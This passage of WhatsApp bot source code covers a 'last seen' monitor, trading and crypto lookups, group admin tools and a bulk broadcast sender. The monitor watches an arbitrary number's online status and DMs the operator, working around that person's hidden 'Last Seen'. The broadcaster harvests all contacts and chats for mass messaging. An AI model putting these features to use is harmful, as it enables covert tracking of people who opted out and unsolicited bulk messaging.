        try {
            const ppUrl = await devtrust.profilePictureUrl(lsTarget);
            hasProfilePic = !!ppUrl;
        } catch {}
        if (hasProfilePic) info.push("\u{1F5BC}\uFE0F Profile picture visible");

        try {
            await devtrust.subscribePresence(lsTarget);
            reply("\u{1F440} *Last Seen Monitor ON*\n\n\u{1F3AF} @" + lsNum + "\n" + info.join('\n') + "\n\n\u{1F4E2} Jab user online/offline hoga, tumhe DM mein update milega!\n\u23F0 5 minute tak monitor karunga.");

            let seenCount = 0;
            const lsHandler = async (update) => {
                const { presences } = update;
                if (!presences?.[lsTarget]) return;
                seenCount++;
                if (seenCount > 5) { devtrust.ev.off('presence.update', lsHandler); return; }
                const p = presences[lsTarget];
                const now = new Date().toLocaleTimeString('en-PK', { timeZone: 'Asia/Karachi' });
                const status = p.lastKnownPresence === 'available' ? "\u{1F7E2} Online" : "\u{1F534} Last seen: " + now;
                devtrust.sendMessage(m.sender, { text: "\u{1F440} *Last Seen Update*\n\u{1F464} @" + lsNum + "\n" + status });
            };
            devtrust.ev.on('presence.update', lsHandler);
            setTimeout(() => devtrust.ev.off('presence.update', lsHandler), 5 * 60 * 1000);
            return;
        } catch (subErr) {}

        reply("\u{1F440} *Last Seen \u2014 @" + lsNum + "*\n\n" + info.join('\n') + "\n\n\u{1F512} *Privacy:* User ne \"Last Seen\" hide kiya hua hai.\n\n*Tips to get last seen:*\n1\uFE0F\u20E3 User ko message karo \u2014 jab reply kare, tab pata chalega\n2\uFE0F\u20E3 Group mein ho toh .stalk @user try karo\n3\uFE0F\u20E3 Jab user online aaye, monitor ON ho jayega");

    } catch (err) {
        reply("\u274C *Last Seen Error*\n\u{1F464} @" + lsNum + "\n\u{1F41B} " + (err.message || 'Unknown error') + "\n\n_Try: .lastseen 923XXXXXXXXX_");
    }
}
break;

// ============ MISSING COMMANDS FIX ============

case 'mediafire': {
    if (!text) return reply(`📁 *Usage:* ${prefix}mediafire <url>`);
    try {
        reply(`⏳ *Fetching Mediafire...*`);
        const res = await axios.get(`https://api.nasirxml.my.id/api/mediafire?url=${encodeURIComponent(text)}`, { timeout: 15000 });
        if (!res.data?.data?.link) return reply(`❌ *Invalid or unsupported Mediafire URL*`);
        const { filename, size, mime, link } = res.data.data;
        await devtrust.sendMessage(m.chat, {
            document: { url: link },
            mimetype: mime || 'application/octet-stream',
            fileName: filename || 'download.zip',
            caption: `📁 *${filename}*\n📊 Size: ${size}\n\n_Downloaded via CYBER_`
        }, { quoted: m });
    } catch (e) {
        reply(`❌ *Mediafire Error:* ${e.message}`);
    }
}
break;

case 'tictactoe':
case 'ttt': {
    if (!m.isGroup) return reply(`👥 *Groups only!*`);
    const TicTacToe = require('./lib/tictactoe');
    if (!text) return reply(`❌ *Usage:* ${prefix}tictactoe @tag\n\nExample: ${prefix}tictactoe @user`);
    let opponent = m.mentionedJid?.[0] || m.quoted?.sender;
    if (!opponent) return reply(`❌ Tag a user to play!`);
    if (opponent === m.sender) return reply(`❌ You can't play against yourself!`);
    
    const game = new TicTacToe(m.sender, opponent, {
        _winScore: 100,
        _botTurn: false,
    });
    global.tttGames = global.tttGames || {};
    global.tttGames[m.chat] = game;
    
    const board = game.renderBoard();
    reply(`🎮 *TicTacToe Started!*\n\n${board}\n\n🔴 @${m.sender.split('@')[0]} vs 🔵 @${opponent.split('@')[0]}\n\nType *${prefix}suit* <number> to play (1-9)`);
}
break;

case 'goodbye': {
    if (!m.isGroup) return reply(`👥 *Groups only!*`);
    if (!isCreator && !isAdmins) return reply(`🔒 *Admin only!*`);
    if (!text) {
        const current = global.db?.data?.chats?.[m.chat]?.goodbye || 'Not set';
        return reply(`👋 *Current Goodbye Message:*\n\n${current}\n\n*Set with:* ${prefix}goodbye <message>\nUse @user to mention leaver`);
    }
    global.db = global.db || { data: { chats: {} } };
    global.db.data.chats[m.chat] = global.db.data.chats[m.chat] || {};
    global.db.data.chats[m.chat].goodbye = text;
    reply(`👋 *Goodbye message set!*\n\n${text}`);
}
break;

case 'linkgc':
// ✅ FIX: duplicate 'grouplink' case removed — first occurrence at line ~12745 is the active one
// (In JS switch, only the first matching case runs; this was dead code)

case 'listadmins':
case 'admins':
case 'adminlist': {
    if (!m.isGroup) return reply(`👥 *Groups only!*`);
    const groupMetadata = await devtrust.groupMetadata(m.chat);
    const admins = groupMetadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    let msg = `👑 *Group Admins (${admins.length})*\n\n`;
    admins.forEach((admin, i) => {
        msg += `${i+1}. @${admin.id.split('@')[0]}\n`;
    });
    reply(msg);
}
break;

case 'warn': {
    if (!m.isGroup) return reply(`👥 *Groups only!*`);
    if (!isCreator && !isAdmins) return reply(`🔒 *Admin only!*`);
    let target = m.mentionedJid?.[0] || m.quoted?.sender;
    if (!target) return reply(`⚠️ *Tag a user to warn!*\n\nUsage: ${prefix}warn @user [reason]`);
    
    global.db = global.db || { data: { users: {} } };
    global.db.data.users[target] = global.db.data.users[target] || {};
    const warnings = (global.db.data.users[target].warn || 0) + 1;
    global.db.data.users[target].warn = warnings;
    
    let reason = text.split(' ').slice(1).join(' ') || 'No reason';
    reply(`⚠️ *User Warned!*\n\n👤 @${target.split('@')[0]}\n⚠️ Warnings: ${warnings}/3\n📝 Reason: ${reason}\n\n${warnings >= 3 ? '🚫 *3 warnings reached! User should be removed.*' : ''}`);
}
break;

case 'resetwarn':
case 'unwarn': {
    if (!m.isGroup) return reply(`👥 *Groups only!*`);
    if (!isCreator && !isAdmins) return reply(`🔒 *Admin only!*`);
    let target = m.mentionedJid?.[0] || m.quoted?.sender;
    if (!target) return reply(`⚠️ *Tag a user to reset warnings!*`);
    
    global.db = global.db || { data: { users: {} } };
    if (global.db.data.users[target]) {
        global.db.data.users[target].warn = 0;
    }
    reply(`✅ *Warnings reset for* @${target.split('@')[0]}!`);
}
break;

case 'qrcode':
case 'qr': {
    if (!text) return reply(`📱 *Usage:* ${prefix}qrcode <text/url>`);
    try {
        reply(`🔄 *Generating QR Code...*`);
        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=${encodeURIComponent(text)}`;
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: qrUrl },
                caption: `📱 *QR Code for:*\n\n${text.substring(0, 200)}${text.length > 200 ? '...' : ''}`
            }),
            { quoted: m }
        );
    } catch (e) {
        reply(`❌ *QR Error:* ${e.message}`);
    }
}
break;

// ============ TRADING COMMANDS ============

case 'trade': {
    await devtrust.sendMessage(m.chat, { react: { text: '📈', key: m.key } });
    const countries = getCountriesList();
    reply(`📊 *STOCK MARKETS* — Select a Country\n\n${countries}\n\n💡 *Usage:* ${prefix}stock <country_code>\n📖 *Example:* ${prefix}stock PK`);
}
break;

case 'stock': {
    if (!text) return reply(`📊 *Usage:* ${prefix}stock <country_code> [page]\n\n${getCountriesList()}\n\n📖 *Example:* ${prefix}stock pk\n📖 *Example:* ${prefix}stock us 2`);

    await devtrust.sendMessage(m.chat, { react: { text: '🔄', key: m.key } });

    const parts = text.trim().toLowerCase().split(/\s+/);
    const countryCode = parts[0];
    const page = parseInt(parts[1]) || 1;

    const info = getStocksListPage(countryCode, page - 1, 50);
    if (!info) return reply(`❌ *Invalid country code:* ${countryCode.toUpperCase()}\n\n${getCountriesList()}`);

    let msg = `📊 *${info.name}* — ${info.exchange}\n` +
              `*Page ${info.page} / ${info.totalPages}* (${info.count} stocks)\n\n` +
              `${info.stocks}\n\n`;
    if (info.hasMore) msg += `💡 Next: ${prefix}stock ${countryCode} ${page + 1}\n`;
    msg += `💡 Price: ${prefix}stockinfo <symbol>`;
    reply(msg);
}
break;

case 'stockinfo': {
    if (!text) return reply(`📊 *Usage:* ${prefix}stockinfo <symbol>\n📖 *Example:* ${prefix}stockinfo AAPL\n\n📖 *Pakistan:* ${prefix}stockinfo HBL\n📖 *India:* ${prefix}stockinfo RELIANCE.NS`);

    await devtrust.sendMessage(m.chat, { react: { text: '🔄', key: m.key } });
    
    try {
        const symbol = text.trim().toUpperCase();
        const data = await getStockPrice(symbol);
        
        if (!data) return reply(`❌ *Could not fetch data for:* ${symbol}\n\n🔧 Possible reasons:\n• Market is closed\n• Invalid symbol\n• API rate limit\n\nTry again later or check the symbol.`);
        
        const changeEmoji = data.change >= 0 ? '🟢' : '🔴';
        
        reply(`📊 *${data.name}* (${data.symbol})\n` +
              `───────────────────────\n` +
              `💰 *Price:* ${formatPrice(data.price)}\n` +
              `📉 *Open:* ${formatPrice(data.open)}\n` +
              `📈 *High:* ${formatPrice(data.high)}\n` +
              `📉 *Low:* ${formatPrice(data.low)}\n` +
              `📈 *Change:* ${changeEmoji} ${data.change >= 0 ? '+' : ''}${data.change.toFixed(2)} (${formatChange(data.changePct)})\n` +
              `📊 *Volume:* ${formatVolume(data.volume)}\n` +
              `💵 *Market Cap:* ${formatCurrency(data.marketCap)}\n` +
              `🏷️ *Exchange:* ${data.exchange || 'N/A'}\n` +
              `📊 *52W High:* ${formatPrice(data.fiftyTwoWeekHigh)}\n` +
              `📉 *52W Low:* ${formatPrice(data.fiftyTwoWeekLow)}\n` +
              `───────────────────────\n` +
              `💎 *Buy/Sell Pressure:* ${data.buyPressure}\n` +
              `📊 *Market Status:* ${data.marketStatus}`);
    } catch (e) {
        reply(`❌ *Stock Error:* ${e.message}`);
    }
}
break;

case 'crypto': {
    if (!text) return reply(`🤑 *Usage:* ${prefix}crypto [page]\n📖 *Example:* ${prefix}crypto\n📖 *Example:* ${prefix}crypto 2\n\n✅ Shows 20 coins per page (200 total)`);

    await devtrust.sendMessage(m.chat, { react: { text: '🔄', key: m.key } });

    try {
        const page = parseInt(text.trim()) || 1;
        const perPage = 20;
        const coins = await getCryptoTop(200);
        if (!coins) return reply(`❌ *Crypto API unavailable* \u2014 try again later.`);

        const totalPages = Math.ceil(coins.length / perPage);
        const start = (page - 1) * perPage;
        const end = Math.min(start + perPage, coins.length);
        const pageCoins = coins.slice(start, end);

        let lines = `🤑 *TOP 200 CRYPTOCURRENCIES*\n*Page ${page} / ${totalPages}* (${coins.length} coins)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n`;
        pageCoins.forEach((c, i) => {
            const rank = start + i + 1;
            const emoji = c.change24h >= 0 ? '🟢' : '🔴';
            lines += `${rank}. *${c.name}* (${c.symbol})\n   💰 ${formatPrice(c.price)} | ${emoji} ${c.change24h?.toFixed(2) || 0}%\n   💵 Cap: ${formatCurrency(c.marketCap)} | Vol: ${formatVolume(c.volume24h)}\n\n`;
        });
        if (page < totalPages) lines += `💡 Next: ${prefix}crypto ${page + 1}\n`;
        lines += `💡 *Detail:* ${prefix}cryptoinfo <coin_name>\n📖 *Example:* ${prefix}cryptoinfo BTC`;

        reply(lines);
    } catch (e) {
        reply(`❌ *Crypto Error:* ${e.message}`);
    }
}
break;

case 'cryptoinfo': {
    if (!text) return reply(`💵 *Usage:* ${prefix}cryptoinfo <coin_name>\n📖 *Example:* ${prefix}cryptoinfo bitcoin\n📖 *Example:* ${prefix}cryptoinfo ethereum`);
    
    await devtrust.sendMessage(m.chat, { react: { text: '🔄', key: m.key } });
    
    try {
        let coinId = text.trim().toLowerCase();
        
        // Resolve coin ID via trading.js SYMBOL_MAP
        coinId = resolveCoinId(coinId);
        
        const data = await getCryptoDetail(coinId);
        if (!data) {
            // Try search
            const search = await searchCrypto(coinId);
            if (search && search.length > 0) {
                let msg = `❌ *"${text.trim()}" not found.* Did you mean:\n\n`;
                search.forEach((s, i) => {
                    msg += `${i + 1}. *${s.name}* (${s.symbol}) — ${prefix}cryptoinfo ${s.id}\n`;
                });
                return reply(msg);
            }
            return reply(`❌ *Coin not found:* ${text.trim()}\n\n📖 Try: ${prefix}cryptoinfo bitcoin`);
        }
        
        const changeEmoji24 = data.change24h >= 0 ? '🟢' : '🔴';
        const changeEmoji7 = data.change7d >= 0 ? '🟢' : '🔴';
        
        reply(`🤑 *${data.name}* (${data.symbol})\n` +
              `───────────────────────\n` +
              `💰 *Price:* ${formatPrice(data.price)}\n` +
              `📈 *24h Change:* ${changeEmoji24} ${formatChange(data.change24h)}\n` +
              `📈 *7d Change:* ${changeEmoji7} ${formatChange(data.change7d)}\n` +
              `📉 *30d Change:* ${formatChange(data.change30d)}\n` +
              `💵 *Market Cap:* ${formatCurrency(data.marketCap)}\n` +
              `📊 *Volume (24h):* ${formatVolume(data.volume24h)}\n` +
              `📈 *24h High:* ${formatPrice(data.high24h)}\n` +
              `📉 *24h Low:* ${formatPrice(data.low24h)}\n` +
              `🚀 *All-Time High:* ${formatPrice(data.ath)} (${data.athChange?.toFixed(1) || 0}% from ATH)\n` +
              `📊 *Circulating Supply:* ${formatVolume(data.circulatingSupply)} ${data.symbol}\n` +
              `📊 *Total Supply:* ${formatVolume(data.totalSupply)} ${data.symbol}\n` +
              `───────────────────────\n` +
              `💎 *Buy Pressure:* ${data.buyPressure}\n` +
              `📊 *Market Sentiment:* ${data.sentiment}`);
    } catch (e) {
        reply(`❌ *Crypto Error:* ${e.message}`);
    }
}
break;

case 'tradingmenu':
case 'tradeMenu': {
    await devtrust.sendMessage(m.chat, { react: { text: '📈', key: m.key } });
    reply(`📊 *CYBER — TRADING MENU*\n\n` +
          `📊 ${prefix}trade — Countries list\n` +
          `📉 ${prefix}stock <country> [page] — Country stocks (50/pg)\n` +
          `💰 ${prefix}stockinfo <symbol> — Stock price + pressure\n` +
          `🤑 ${prefix}crypto [page] — Top 20 of 200+ coins\n` +
          `💵 ${prefix}cryptoinfo <coin> — Crypto detail\n` +
          `🟢 ${prefix}topgainers — Biggest 24h gainers (crypto)\n` +
          `🔴 ${prefix}toplosers — Biggest 24h losers (crypto)\n` +
          `📈 *Markets:* PK · US · IN · UK · DE · CN · CA · AU · SA\n\n` +
          `📖 *Examples:*\n${prefix}stock pk 1 · ${prefix}stock us 2\n${prefix}cryptoinfo btc · ${prefix}cryptoinfo ETH\n${prefix}topgainers · ${prefix}toplosers\n\n` +
          `⚡ Powered by CoinGecko + Yahoo Finance`);
}
break;

case 'topgainers': {
    await devtrust.sendMessage(m.chat, { react: { text: '\ud83d\udfe2', key: m.key } });
    try {
        const gainers = await getCryptoGainers(20);
        if (!gainers) return reply('\u274c *API unavailable* \u2014 try again later.');
        let msg = `\ud83d\udfe2 *TOP 20 CRYPTO GAINERS (24h)*\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n`;
        gainers.forEach((c, i) => {
            msg += `${i + 1}. *${c.name}* (${c.symbol})\n   \ud83d\udcb0 ${formatPrice(c.price)} | \ud83d\udfe2 +${c.change24h?.toFixed(2) || 0}%\n   \ud83d\udcb5 Cap: ${formatCurrency(c.marketCap)}\n\n`;
        });
        msg += `\ud83d\udca1 *Detail:* ${prefix}cryptoinfo <coin_name>`;
        reply(msg);
    } catch (e) {
        reply(`\u274c *Error:* ${e.message}`);
    }
}
break;

case 'toplosers': {
    await devtrust.sendMessage(m.chat, { react: { text: '\ud83d\udd34', key: m.key } });
    try {
        const losers = await getCryptoLosers(20);
        if (!losers) return reply('\u274c *API unavailable* \u2014 try again later.');
        let msg = `\ud83d\udd34 *TOP 20 CRYPTO LOSERS (24h)*\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n`;
        losers.forEach((c, i) => {
            msg += `${i + 1}. *${c.name}* (${c.symbol})\n   \ud83d\udcb0 ${formatPrice(c.price)} | \ud83d\udd34 ${c.change24h?.toFixed(2) || 0}%\n   \ud83d\udcb5 Cap: ${formatCurrency(c.marketCap)}\n\n`;
        });
        msg += `\ud83d\udca1 *Detail:* ${prefix}cryptoinfo <coin_name>`;
        reply(msg);
    } catch (e) {
        reply(`\u274c *Error:* ${e.message}`);
    }
}
break;

// ═════════════════════════════════════════════════════════════════════
// 📢 BROADCAST — Bulk message sender (groups + private chats)
// ═════════════════════════════════════════════════════════════════════

// ── Helper: get all groups where bot is a member ─────────────────────
async function getAllGroups(nexus) {
    const chats = [];
    const seen = new Set();
    // Source 1: persistent file saved by pair.js
    try {
        const _gf = require('path').join(__dirname, 'database', 'groups.json');
        if (fs.existsSync(_gf)) {
            const _glist = JSON.parse(fs.readFileSync(_gf, 'utf-8'));
            for (const [id, data] of Object.entries(_glist)) {
                if (id.endsWith('@g.us') && !seen.has(id)) {
                    seen.add(id);
                    chats.push({ id, name: data?.name || 'Unknown Group', participants: data?.participants || 0 });
                }
            }
        }
    } catch (_e) {}
    // Source 2: live API
    try {
        const groups = await nexus.groupFetchAllParticipating();
        for (const [id, meta] of Object.entries(groups || {})) {
            if (!seen.has(id)) {
                seen.add(id);
                chats.push({ id, name: meta.subject || 'Unknown Group', participants: meta.participants?.length || 0 });
            }
        }
    } catch (e) {
        console.log('[Broadcast] groupFetchAllParticipating failed:', e.message);
    }
    return chats;
}

// ── Helper: get all private chats from persistent file + store ──────────
function getAllPrivateChats(storeObj) {
    try {
        const seen = new Set();
        const chats = [];

        const _addEntry = (id, name) => {
            if (!id) return;
            if (id.includes('@g.us') || id.includes('@broadcast') || id.includes('@newsletter')) return;
            if (!id.includes('@s.whatsapp.net') && !id.match(/^\d+@/)) return;
            if (seen.has(id)) return;
            seen.add(id);
            chats.push({ id, name: name || id.split('@')[0] });
        };

        // Source 0: DB backup — Heroku/Replit restart ke baad bhi zinda (filesystem wipe ho jaata hai)
        try {
            const _nexus = global._activeNexusSocket || (typeof devtrust !== 'undefined' ? devtrust : null);
            const _botNum = String(_nexus?.user?.id || '').split(':')[0].split('@')[0];
            if (_botNum && global._pcDbCache && global._pcDbCache[_botNum]) {
                for (const e of global._pcDbCache[_botNum]) {
                    _addEntry(e.id, e.name);
                }
            }
        } catch (_e0) {}

        // Source 1: Persistent file — database/private_chats.json (saved by pair.js on every message)
        try {
            const _pcFile = require('path').join(__dirname, 'database', 'private_chats.json');
            if (fs.existsSync(_pcFile)) {
                const _pcList = JSON.parse(fs.readFileSync(_pcFile, 'utf-8'));
                for (const [id, data] of Object.entries(_pcList)) {
                    _addEntry(id, data?.name || '');
                }
            }
        } catch (_e) {}

        // Source 2: store.chats (in-memory — may be empty after restart)
        if (storeObj && storeObj.chats) {
            const allChats = storeObj.chats;
            const entries = typeof allChats.entries === 'function'
                ? [...allChats.entries()]
                : Object.entries(allChats);
            for (const [, chat] of entries) {
                _addEntry(chat.id || chat.chatId || '', chat.name || chat.notify || '');
            }
        }

        // Source 3: store.contacts (populated from WhatsApp contact sync)
        if (storeObj && storeObj.contacts) {
            const contacts = storeObj.contacts;
            const entries = typeof contacts.entries === 'function'
                ? [...contacts.entries()]
                : Object.entries(contacts);
            for (const [id, contact] of entries) {
                _addEntry(id, contact?.name || contact?.notify || contact?.verifiedName || '');
            }
        }

        return chats;
    } catch (e) {
        console.log('[Broadcast] getAllPrivateChats error:', e.message);
        return [];
    }
}

// ── Helper: send with delay and progress tracking ──────────────────

// ── Helper: detect media type from quoted message ─────────────────
function getQuotedMediaType(quoted) {
    if (!quoted || !quoted.message) return null;
    const msg = quoted.message;
    if (msg.videoMessage) return { type: 'video', msg: msg.videoMessage };
    if (msg.audioMessage) return { type: 'audio', msg: msg.audioMessage };
    if (msg.imageMessage) return { type: 'image', msg: msg.imageMessage };
    if (msg.documentMessage) return { type: 'document', msg: msg.documentMessage };
    return null;
}

// ── Helper: download media buffer from quoted message ────────────
async function downloadQuotedMedia(quoted) {
    try {
        const mediaInfo = getQuotedMediaType(quoted);
        if (!mediaInfo) return null;
        const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
        const stream = await downloadContentFromMessage(mediaInfo.msg, mediaInfo.type);
        const chunks = [];
        for await (const chunk of stream) chunks.push(chunk);
        return { buffer: Buffer.concat(chunks), type: mediaInfo.type };
    } catch (e) {
        console.log('[Broadcast] Media download failed:', e.message);
        return null;
    }
}

// ── Helper: parse user selection (all, 1,2,3, 1-5, 10, first 10) ───────────────────
function parseSelection(input, total) {
    const sel = input.trim().toLowerCase();
    if (sel === 'all' || sel === '*') {
        return { selected: Array.from({ length: total }, (_, i) => i), label: 'all' };
    }
    const firstMatch = sel.match(/^(?:first\s+)?(\d+)$/);
    if (firstMatch) {
        const n = Math.min(parseInt(firstMatch[1], 10), total);
        return { selected: Array.from({ length: n }, (_, i) => i), label: 'first ' + n };
    }
    const rangeMatch = sel.match(/^(\d+)\s*(?:-|\.{2,}|to)\s*(\d+)$/);
    if (rangeMatch) {
        const start = Math.max(0, parseInt(rangeMatch[1], 10) - 1);
        const end = Math.min(total, parseInt(rangeMatch[2], 10));
        if (start >= end) return null;
        return { selected: Array.from({ length: end - start }, (_, i) => start + i), label: (start + 1) + '-' + end };
    }
    const commaMatch = sel.match(/^(\d+(?:\s*,\s*\d+)+)$/);
    if (commaMatch) {
        const indices = sel.split(/\s*,\s*/)
            .map(s => parseInt(s.trim(), 10) - 1)
            .filter(i => i >= 0 && i < total);
        if (!indices.length) return null;
        return { selected: indices, label: indices.map(i => i + 1).join(', ') };
    }
    return null;
}

function formatNumberedList(items, title, emoji, maxShow = 30) {
    let msg = title + ' (*' + items.length + ' total*)\n════════════════\n\n';
    const showCount = Math.min(items.length, maxShow);
    for (let i = 0; i < showCount; i++) {
        const num = (i + 1).toString().padStart(2, ' ');
        const name = (items[i].name || 'Unknown').substring(0, 25);
        msg += num + '. ' + emoji + ' ' + name + '\n';
    }
    if (items.length > maxShow) {
        msg += '\n...and ' + (items.length - maxShow) + ' more\n';
    }
    return msg;
}

function buildSelectPrompt(prefix) {
    return '\n*✨ Select Options:*\n' +
           '• `' + prefix + 'bcsel all` — ALL\n' +
           '• `' + prefix + 'bcsel 1,3,5` — specific numbers\n' +
           '• `' + prefix + 'bcsel 1-5` — range\n' +
           '• `' + prefix + 'bcsel 10` — first 10\n\n' +
           '❌ `' + prefix + 'bcstop` to cancel';
}

// ── Helper: send with delay and progress tracking ──────────────────
async function sendBulk(nexus, targets, message, senderJid, type, mediaBuffer, mediaType) {
    const key = `${senderJid}:${Date.now()}`;
    global.bcActive.set(key, { stopped: false, total: targets.length, sent: 0 });
    const results = { success: 0, failed: 0 };
    const DELAY_MS = 2500;
    const PROGRESS_EVERY = 5;
    let lastProgressKey = null;
    const hasMedia = mediaBuffer && mediaType;

    for (let i = 0; i < targets.length; i++) {
        if (global.bcActive.get(key)?.stopped) {
            global.bcActive.delete(key);
            return { ...results, stopped: true, sent: i };
        }
        const target = targets[i];
        try {
            if (hasMedia) {
                const payload = { caption: message };
                if (mediaType === 'image') payload.image = mediaBuffer;
                else if (mediaType === 'video') payload.video = mediaBuffer;
                else if (mediaType === 'audio') payload.audio = mediaBuffer;
                else if (mediaType === 'document') payload.document = mediaBuffer;
                await nexus.sendMessage(target.id, payload);
            } else {
                await nexus.sendMessage(target.id, { text: message });
            }
            results.success++;
            global.bcActive.get(key).sent = i + 1;
        } catch (e) {
            console.log(`[Broadcast] Failed: ${target.id}:`, e.message);
            results.failed++;
        }
        if ((i + 1) % PROGRESS_EVERY === 0 || i === targets.length - 1) {
            try {
                const mediaLabel = hasMedia ? ` [${mediaType.toUpperCase()}]` : '';
                const progressText = `\ud83d\udce2 *Broadcast Progress* (${type}${mediaLabel})\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\u2705 ${results.success} | \u274c ${results.failed}\n\ud83d\udcca ${i + 1}/${targets.length} (${Math.round(((i + 1) / targets.length) * 100)}%)\n${i + 1 < targets.length ? `_Delay: ${DELAY_MS / 1000}s_` : '_Finishing..._'}`;
                await nexus.sendMessage(senderJid, { text: progressText });
            } catch (_) {}
        }
        if (i < targets.length - 1) {
            await new Promise(r => setTimeout(r, DELAY_MS));
        }
    }
    global.bcActive.delete(key);
    return { ...results, stopped: false, sent: targets.length };
}


// ── BROADCAST MENU ───────────────────────────────────────────────────────
case 'bcmenu':
case 'broadcastmenu': {
    await devtrust.sendMessage(m.chat, { react: { text: '📢', key: m.key } });
    reply(`📢 *CYBER — BROADCAST MENU*

` +
          `🔄 ${prefix}bcauto <msg> — Auto-scanned list (chats + groups)
` +
          `📣 ${prefix}bcgroups <msg> — ALL groups
` +
          `💬 ${prefix}bcusers <msg> — ALL private chats
` +
          `📋 ${prefix}bclist — View auto-scanned contacts
` +
          `🔍 ${prefix}bcscan — Scan with live progress counter
` +
          `🔄 ${prefix}bcrescan — Manually re-scan chats + groups
` +
          `274c ${prefix}bcdel <num> 2014 Remove number from list
` +
          `🚫 ${prefix}bcstop — Cancel active broadcast
` +
          `⚙️ ${prefix}bcsettings on/off — Per-User ON/OFF

` +
          `*How to use:*
` +
          `1. ${prefix}bcauto Eid Mubarak!
` +
          `2. Preview + confirmation milega
` +
          `3. Reply ${prefix}yesbc to confirm
` +
          `4. Messages sent with 2.5s gap

` +
          `🎯 *Auto-Scan:* Bot connect hone ke 1 min mein
` +
          `sare previous chats aur groups auto-collect hojate hain!`);
}
break;

// ── BCGROUPS ─────────────────────────────────────────────────────────
case 'bcgroups': {
    if (!getBcSettings(m.sender).enabled) return reply('\u26d4 *Broadcast OFF!*\n\nApne settings mein broadcast band hai.\n"' + prefix + 'bcsettings on" kar ke chalu karo.');
    if (!text) return reply('\ud83d\udce3 *Usage:* ' + prefix + 'bcgroups <message>\n\n*Example:* ' + prefix + 'bcgroups Eid Mubarak everyone!');

    await devtrust.sendMessage(m.chat, { react: { text: '\ud83d\udce3', key: m.key } });
    const groups = await getAllGroups(devtrust);
    if (!groups.length) return reply('\u274c *No groups found* \u2014 bot is not in any groups.');

    let mediaInfo = null;
    const qm = getQuotedMediaType(m.quoted);
    if (qm) mediaInfo = { type: qm.type, msg: qm.msg };
    const mediaLabel = mediaInfo ? ' [' + mediaInfo.type.toUpperCase() + ']' : '';

    let preview = '\ud83d\udce3 *BROADCAST LIST*' + mediaLabel + '\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\n';
    preview += formatNumberedList(groups, '\ud83d\udcc1 *Groups*', '\ud83d\udcc1');
    preview += '\n*\ud83d\udcdd Message:* ' + text.substring(0, 80) + (text.length > 80 ? '...' : '') + '\n';
    preview += '\n*\u23f0 Delay:* 2.5s between messages';
    preview += buildSelectPrompt(prefix);
    reply(preview);

    global.bcPending.set(m.sender, {
        type: 'groups', message: text, targets: groups,
        mediaInfo: mediaInfo,
        selectedTargets: null,
        selectionLabel: null,
        expiresAt: Date.now() + 5 * 60 * 1000
    });
}
break;
break;

// ── BCUSERS ─────────────────────────────────────────────────────────
case 'bcusers': {
    if (!getBcSettings(m.sender).enabled) return reply('\u26d4 *Broadcast OFF!*\n\nApne settings mein broadcast band hai.\n"' + prefix + 'bcsettings on" kar ke chalu karo.');
    if (!text) return reply('\ud83d\udcac *Usage:* ' + prefix + 'bcusers <message>\n\n*Example:* ' + prefix + 'bcusers Eid Mubarak!');

    await devtrust.sendMessage(m.chat, { react: { text: '\ud83d\udcac', key: m.key } });
    const users = getAllPrivateChats(store);
    if (!users.length) return reply('\u274c *No private chats found* \u2014 start conversations first.');

    let mediaInfo = null;
    const qm = getQuotedMediaType(m.quoted);
    if (qm) mediaInfo = { type: qm.type, msg: qm.msg };
    const mediaLabel = mediaInfo ? ' [' + mediaInfo.type.toUpperCase() + ']' : '';

    let preview = '\ud83d\udcac *BROADCAST LIST*' + mediaLabel + '\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\n';
    preview += formatNumberedList(users, '\ud83d\udc65 *Private Chats*', '\ud83d\udc64');
    preview += '\n*\ud83d\udcdd Message:* ' + text.substring(0, 80) + (text.length > 80 ? '...' : '') + '\n';
    preview += '\n*\u23f0 Delay:* 2.5s between messages';
    preview += buildSelectPrompt(prefix);
    reply(preview);

    global.bcPending.set(m.sender, {
        type: 'users', message: text, targets: users,
        mediaInfo: mediaInfo,
        selectedTargets: null,
        selectionLabel: null,
        expiresAt: Date.now() + 5 * 60 * 1000
    });
}
break;

// ── YESBC (CONFIRM) ─────────────────────────────────────────────────────
case 'yesbc': {
    const pending = global.bcPending.get(m.sender);
    if (!pending) return reply('\u274c *No pending broadcast!*\n\nPehle use karo:\n' + prefix + 'bcauto <msg>\n' + prefix + 'bcgroups <msg>\n' + prefix + 'bcusers <msg>');
    if (Date.now() > pending.expiresAt) {
        global.bcPending.delete(m.sender);
        return reply('\u23f0 *Broadcast expired* \u2014 timed out (5 min).');
    }

    await devtrust.sendMessage(m.chat, { react: { text: '\u2705', key: m.key } });
    global.bcPending.delete(m.sender);

    const targets = pending.selectedTargets || pending.targets;
    const selectionLabel = pending.selectionLabel ? ' (' + pending.selectionLabel + ')' : ' (all)';
    let typeLabel;
    if (pending.type === 'groups') typeLabel = '\ud83d\udce3 GROUPS';
    else if (pending.type === 'users') typeLabel = '\ud83d\udcac PRIVATE CHATS';
    else typeLabel = '\ud83d\udd04 AUTO-SCAN (Chats + Groups)';

    let mediaBuffer = null;
    let mediaType = null;
    if (pending.mediaInfo) {
        try {
            const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
            const stream = await downloadContentFromMessage(pending.mediaInfo.msg, pending.mediaInfo.type);
            const chunks = [];
            for await (const chunk of stream) chunks.push(chunk);
            mediaBuffer = Buffer.concat(chunks);
            mediaType = pending.mediaInfo.type;
        } catch (e) {
            console.log('[Broadcast] Media download failed:', e.message);
        }
    }

